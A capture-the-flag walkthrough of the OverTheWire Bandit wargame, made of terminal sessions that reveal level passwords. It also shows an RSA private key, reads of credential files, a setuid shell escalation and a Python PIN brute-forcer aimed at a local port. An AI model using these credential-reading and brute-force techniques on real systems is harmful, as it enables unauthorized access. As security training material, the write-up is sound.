# Bandit

## Bandit0 -> Bandit1
```
bandit0@bandit:~$ cat readme
boJ9jbbUNNfktd78OOpsqOltutMc3MY1
bandit0@bandit:~$
```
## Bandit1 -> Bandit2
```
find . -exec cat '{}' \; -print
SNIP
CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9
SNIP
```
## Bandit2 - 3
```
bandit2@bandit:~$ cat spaces\ in\ this\ filename
UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK
bandit2@bandit:~$
```
## Bandit3 - 4
```
bandit3@bandit:~$ ls -la
total 24
drwxr-xr-x  3 root root 4096 Oct 16  2018 .
drwxr-xr-x 41 root root 4096 Oct 16  2018 ..
-rw-r--r--  1 root root  220 May 15  2017 .bash_logout
-rw-r--r--  1 root root 3526 May 15  2017 .bashrc
drwxr-xr-x  2 root root 4096 Oct 16  2018 inhere
-rw-r--r--  1 root root  675 May 15  2017 .profile
bandit3@bandit:~$ cd inhere/
bandit3@bandit:~/inhere$ ls -la
total 12
drwxr-xr-x 2 root    root    4096 Oct 16  2018 .
drwxr-xr-x 3 root    root    4096 Oct 16  2018 ..
-rw-r----- 1 bandit4 bandit3   33 Oct 16  2018 .hidden
bandit3@bandit:~/inhere$ cat .hidden
pIwrPrtPN36QITSp3EQaw936yaFoFgAB
bandit3@bandit:~/inhere$
```
## Bandit4 - 5
```
bandit4@bandit:~/inhere$ cat ./-file07
koReBOKuIDDepwhWk7jZC0RTdopnAYKh
bandit4@bandit:~/inhere$
```
## Bandit5 - 6
```
bandit5@bandit:~/inhere$ find . -type f -readable -size 1033c ! -executable -exec cat '{}' \; -print
DXjZPULLxYr17uwoI01bNLQbtFemEgo7
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        ./maybehere07/.file2
bandit5@bandit:~/inhere$
```
## Bandit6 - 7
```
bandit6@bandit:~$ find / -user bandit7 -print 2>/dev/null
/run/screen/S-bandit7
/var/lib/dpkg/info/bandit7.password
/dev/pts/18
/dev/pts/24
/etc/bandit_pass/bandit7
bandit6@bandit:~$ cat /var/lib/dpkg/info/bandit7.password
HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs
bandit6@bandit:~$
```
## Bandit7 - 8
```
bandit7@bandit:~$ cat data.txt | grep millionth
millionth       cvX2JJa4CFALtqS87jk27qwqGhBM9plV
bandit7@bandit:~$
```
## Bandit8 - 9
```
bandit8@bandit:~$ bandit8@bandit:~$ cat data.txt | sort | uniq -c | sort -r
      1 UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR
     10 YzZX7E35vOa6IQ9SRUGdlEpyaiyjvWXE
     10 yXGLvp7UaeiDKxLGXQYlWuRWdIgeCaT0
     10 YR0sflfJZ34iuY3wM3DNNO19dBYnJDmt
```
## Bandit9 - 10
```
bandit9@bandit:~$ cat data.txt | strings -n32
========== truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk
bandit9@bandit:~$
```
## Bandit10 - 11
```
bandit10@bandit:~$ cat data.txt
VGhlIHBhc3N3b3JkIGlzIElGdWt3S0dzRlc4TU9xM0lSRnFyeEUxaHhUTkViVVBSCg==
bandit10@bandit:~$ cat data.txt  | base64 -d
The password is IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR
bandit10@bandit:~$
```
## Bandit11 - 12
```
bandit11@bandit:~$ cat data.txt
Gur cnffjbeq vf 5Gr8L4qetPEsPk8htqjhRK8XSP6x2RHh
bandit11@bandit:~$ cat data.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m'
The password is 5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu
bandit11@bandit:~$
```
## Bandit12 - 13
```
bandit12@bandit:/tmp/jb1$ cat data8.
The password is 8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL
bandit12@bandit:/tmp/jb1$
```
## Bandit13 - 14
```
bandit13@bandit:~$ ssh -i sshkey.private bandit14@localhost
Could not create directory '/home/bandit13/.ssh'.
The authenticity of host 'localhost (127.0.0.1)' can't be established.
ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc.
Are you sure you want to continue connecting (yes/no)? yes
Failed to add the host to the list of known hosts (/home/bandit13/.ssh/known_hosts).
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

Linux bandit 4.18.12 x86_64 GNU/Linux

```
## Bandit14 - 15
```
bandit14@bandit:~$ cat /etc/bandit_pass/bandit14
4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e
bandit14@bandit:~$ nc 127.0.0.1 30000
4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e
Correct!
BfMYroe26WYalil77FoDi9qh59eK5xNr

bandit14@bandit:~$
```
## Bandit15 - 16
```
bandit15@bandit:~$ openssl s_client -connect 127.0.0.1:30001
CONNECTED(00000003)
depth=0 CN = localhost
verify error:num=18:self signed certificate
verify return:1
depth=0 CN = localhost
verify return:1

...SNIP
BfMYroe26WYalil77FoDi9qh59eK5xNr
Correct!
cluFn7wTiGryunymYOu4RcffSxQluehd

closed
```
## Bandit16 - 17
```
bandit16@bandit:~$ openssl s_client -connect 127.0.0.1:31790
CONNECTED(00000003)
depth=0 CN = localhost
verify error:num=18:self signed certificate
verify return:1
depth=0 CN = localhost
verify return:1
---
SNIP...
---
cluFn7wTiGryunymYOu4RcffSxQluehd
Correct!
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ
imZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ
Ja6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu
DSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbW
JGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNX
x0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvD
KHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBl
J9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovd
d8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nC
YNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8A
vLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama
+TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT
8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnx
SatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHd
HCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+Exdvt
SghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0A
R57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDi
Ttiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCg
R8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiu
L8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Ni
blh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkU
YOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM
77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b
dxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3
vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=
-----END RSA PRIVATE KEY-----

```
## Bandit17 - 18
```
bandit17@bandit:~$ diff passwords.new passwords.old
42c42
< kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd
---
> hlbSBPAWJmL6WFDb06gpTx1pPButblOA
```
## Bandit18 - 19
```
C:\Users\Jay [19] DESKTOP-SU9J5D3\Jay PS>ssh bandit18@bandit.labs.overthewire.org -p2220 /bin/bash
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

bandit18@bandit.labs.overthewire.org's password:

ls
readme
cat readme
IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x
```
## Bandit19 - 20
```
bandit19@bandit:~$ ./bandit20-do whoami
bandit20
bandit19@bandit:~$ ./bandit20-do id
uid=11019(bandit19) gid=11019(bandit19) euid=11020(bandit20) groups=11019(bandit19)
bandit19@bandit:~$ ./bandit20-do sh
$ whoami
bandit20
$ cat bandit20
GbKksEFF4yrVs6il55v6gwY5aVje5f0j
```
## Bandit20 - 21
```
bandit20@bandit:~$ echo -n "GbKksEFF4yrVs6il55v6gwY5aVje5f0j" | nc -lnvp 25001
listening on [any] 25001 ...


bandit20@bandit:~$ ./suconnect 25001
Read: GbKksEFF4yrVs6il55v6gwY5aVje5f0j
Password matches, sending next password

connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 33826
gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr
bandit20@bandit:~$

```
## Bandit21 - 22
```
bandit21@bandit:~$ ls -la /etc/cron.d
total 24
drwxr-xr-x  2 root root 4096 Oct 16  2018 .
drwxr-xr-x 88 root root 4096 Oct 16  2018 ..
-rw-r--r--  1 root root  120 Oct 16  2018 cronjob_bandit22
-rw-r--r--  1 root root  122 Oct 16  2018 cronjob_bandit23
-rw-r--r--  1 root root  120 Oct 16  2018 cronjob_bandit24
-rw-r--r--  1 root root  102 Oct  7  2017 .placeholder
bandit21@bandit:~$ cat /etc/cron.d/*
@reboot bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit21@bandit:~$ cat /usr/bin/cronjob_bandit22.sh
#!/bin/bash
chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
bandit21@bandit:/etc/cron.d$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
bandit21@bandit:/etc/cron.d$
```
## Bandit22 - 23
```
bandit22@bandit:~$ $(echo I am user bandit23 | md5sum | cut -d ' ' -f 1)
-bash: 8ca319486bfbbc3663ea0fbe81326349: command not found
bandit22@bandit:~$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
```
## Bandit23 - 24
Password found for both Bandit24 and 25 :-)
```
bandit23@bandit:/var/spool/bandit24/ferdi123$ cat brute.txt | cut -d ' ' -f1 | sort | uniq
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ

UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
||
bandit23@bandit:/var/spool/bandit24/ferdi123$ /usr/bin/cronjob_bandit24.sh
/usr/bin/cronjob_bandit24.sh: line 5: cd: /var/spool/bandit23: No such file or directory
Executing and deleting all scripts in /var/spool/bandit23:
Handling brute.txt
timeout: failed to run command ‘./brute.txt’: Permission denied
rm: cannot remove './brute.txt': Permission denied
Handling list.txt
timeout: failed to run command ‘./list.txt’: Permission denied
rm: cannot remove './list.txt': Permission denied
Handling script.sh
timeout: failed to run command ‘./script.sh’: Permission denied
rm: cannot remove './script.sh': Permission denied
Handling udr2.sh
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Correct!
The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG

Exiting.
rm: cannot remove './udr2.sh': Permission denied
Handling udr.sh
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
```
## Bandit24 - 25
```
bandit24@bandit:~$ cat /tmp/jb.py
#!/usr/bin/python

import socket, time, itertools

password = "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"
host = "127.0.0.1"
port = 30002
bad_reply = "Wrong! Please enter the correct pincode. Try again."

socket.setdefaulttimeout(20)
s = socket.socket()
s.connect((host,port))
reply = s.recv(1024)

# Wait for reply
print reply
time.sleep(1)

attempt = ""
# Create a loop
for combination in itertools.product(xrange(10), repeat=4):
        # Create the pin combo to be submitted.
        #print map(str,combination)
        combination = ''.join(map(str,combination))
        attempt = password + " " + combination + "\n"
        s.send(attempt)
        reply = s.recv(1024)
        if not bad_reply in reply:
            print reply
            break
```

```
Bandit24@bandit:~$ bandit24@bandit:~$ python /tmp/jb.py
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.

Correct!
The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG

Exiting.
```
## Bandit25 - 26
```
v for vim
:e /etc/bandit_pass/bandit26
5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z
```
